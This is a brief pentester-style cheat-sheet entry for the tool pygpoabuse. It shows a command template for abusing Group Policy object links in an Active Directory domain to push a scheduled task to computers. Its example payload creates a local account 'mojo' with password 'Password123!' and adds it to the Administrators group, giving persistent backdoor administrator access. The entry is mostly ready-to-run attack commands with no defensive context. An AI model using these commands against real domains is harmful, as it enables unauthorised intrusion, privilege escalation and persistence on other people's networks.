# pygpoabuse

## Create scheduled task (abuses gplink over computer object)
```
pygpoabuse -gpo-id <gpo_id> -command '<cmd>' -taskname '<task_name|beans>' -description '<description|beans>' <domain>/'<user>'<auth> -v
```

- cmd
net user mojo Password123! /add && net localgroup Administrators mojo /add
